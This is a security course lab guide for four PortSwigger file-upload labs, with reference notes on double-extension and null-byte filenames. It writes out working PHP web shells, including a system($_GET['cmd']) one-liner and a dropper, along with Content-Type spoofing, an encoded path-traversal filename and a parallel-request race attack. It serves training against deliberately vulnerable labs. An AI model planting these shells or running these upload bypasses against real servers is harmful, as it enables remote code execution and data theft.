# Lab Guide: Week 9 — File Upload Vulnerabilities

---

## Part 1: Remote Code Execution via Web Shell Upload
### https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload

**Difficulty:** Apprentice | **Time:** 15–20 minutes

**Steps:**
```
1. Log in with wiener:peter
2. Go to "My Account"
3. Create a file locally named exploit.php:
     <?php system($_GET['cmd']); ?>
4. Upload it as your avatar — no obfuscation needed
5. Note the URL the server confirms it was saved to (typically
   /files/avatars/exploit.php)
6. Navigate to: /files/avatars/exploit.php?cmd=cat+/home/carlos/secret
7. Submit the returned secret via the lab banner button
```

**What to observe:** the complete absence of any pushback from the server — no extension check, no content-type check, no rejection of any kind.

---

## Part 2: Web Shell Upload via Content-Type Restriction Bypass
### https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass

**Difficulty:** Apprentice | **Time:** 20–30 minutes

**Steps:**
```
1. Log in with wiener:peter
2. Attempt to upload exploit.php directly → observe rejection
3. Open Burp Suite, enable Proxy intercept
4. Re-attempt the upload; catch the request in Burp
5. Locate the file part's Content-Type header:
     Content-Type: application/x-php
6. Change it to:
     Content-Type: image/jpeg
7. Leave the filename (exploit.php) and PHP body untouched
8. Forward the request → confirm it's now accepted
9. Navigate to: /files/avatars/exploit.php?cmd=cat+/home/carlos/secret
10. Submit the secret
```

**What to observe:** the extension and file content never changed — only one HTTP header did.

---

## Part 3: Web Shell Upload via Path Traversal
### https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal

**Difficulty:** Practitioner | **Time:** 30–45 minutes

**Steps:**
```
1. Log in with wiener:peter
2. Attempt upload with filename: ../exploit.php
3. Observe the response message — note it says the file was saved
   to avatars/exploit.php (traversal was stripped)
4. In Burp Repeater, modify the filename in the multipart body to:
     ..%2fexploit.php
5. Forward — observe the response now says the file was saved to
   avatars/../exploit.php
6. Navigate to: /files/exploit.php?cmd=cat+/home/carlos/secret
   (note: NOT /files/avatars/ — the file moved up one directory)
7. Submit the secret
```

**What to observe:** the exact same filter that blocked raw `../` never re-checks the string after URL-decoding happens.

---

## Part 4: Web Shell Upload via Race Condition
### https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition

**Difficulty:** Expert | **Time:** 60–90 minutes | **Requires:** Burp Suite, version 2023.9 or later. The "Send group in parallel" capability was added directly to Burp Repeater (not a Professional-exclusive tool) in that release, and PortSwigger's own edition comparison does not list it among Professional-exclusive features — so Community Edition is expected to support it. Do not attempt this race by manually timing two separate requests by hand; a millisecond-scale window is not something human reflexes, or even unassisted network requests, can reliably hit.

**Steps:**
```
1. Log in with wiener:peter
2. Prepare the dropper payload locally, named payload.php:
     <?php file_put_contents('shell.php', '<?php echo file_get_contents("/home/carlos/secret"); ?>'); ?>

3. In Burp, intercept the avatar upload request for payload.php
4. Send this request to Repeater
5. Prepare a second Repeater tab with a GET request to:
     /files/avatars/payload.php

6. Duplicate that GET request tab roughly 20 times. Betting the
   entire attempt on a single GET landing inside a millisecond-scale
   window is fragile — sending a wide spread of duplicate GETs
   alongside the one upload POST dramatically increases the odds
   that at least one of them lands exactly when the file briefly
   exists on disk
7. Select the upload POST plus all ~20 GET tabs and group them
8. Use "Send group in parallel" (single-packet attack) to fire
   the entire group in the same TCP packet
9. Repeat this batch several times if the first attempt doesn't
   land inside the race window — this is a probabilistic attack,
   not guaranteed on the first try
10. After a successful hit, verify shell.php now exists permanently:
     Navigate to /files/avatars/shell.php
11. If the secret is returned, submit it via the lab banner
12. If not yet successful, repeat steps 7–9 — the dropper approach
    means you only need ONE successful race, ever, for this lab
```

**What to observe:** once `shell.php` exists, there is no more racing to do — it persists exactly like any normal uploaded file, because nothing in the application ever targets it for deletion.

---

## Part 5: Double Extension & Null Byte — Reference Practice

These techniques are not tied to a specific numbered lab this week; they are documented as advanced evasion reference material.

**Double extension — where to observe the concept:**
```
Filename: shell.php.jpg

Concept check: this bypass depends entirely on WEB SERVER
configuration (AddHandler vs SetHandler), not on the PortSwigger
lab's application logic. It will not work against the labs above,
which use modern server configurations — it's documented here as
a technique to recognize during real-world engagements against
potentially misconfigured legacy servers.
```

**Null byte injection — why it can't be practiced live against modern PHP:**
```
Filename: shell.php%00.jpg

This exact technique is patched at the PHP language level since version
5.3.4 (2010). Any current PortSwigger lab or modern PHP environment
will not be vulnerable to this specific payload — it is documented as
reference knowledge, not something to attempt against a current PHP target.

However: the null byte's behavior as a C string terminator is not gone
from the world. Modern applications (Python, Node.js, Go) that call
native C/C++ extensions or use a Foreign Function Interface (FFI) can
reintroduce this exact mismatch if they pass user-supplied strings
across that boundary without independent null-byte validation.
Understanding why the technique worked is what matters, not only that
it was patched in PHP.
```

---

## Completion Checklist

- [✓] Lab 1 (Apprentice): No validation — solved
- [✓] Lab 2 (Apprentice): Content-Type bypass — solved
- [✓] Lab 3 (Practitioner): Path traversal — solved
- [✓] Lab 4 (Expert): Race condition — solved
- [✓] Double extension concept — understood, correctly identified as server-config-dependent
- [✓] Null byte injection — understood: patched in modern PHP since 5.3.4, but the underlying C string-terminator mismatch remains an active concern wherever modern code crosses into native C/C++ bindings or FFI without independent null-byte validation
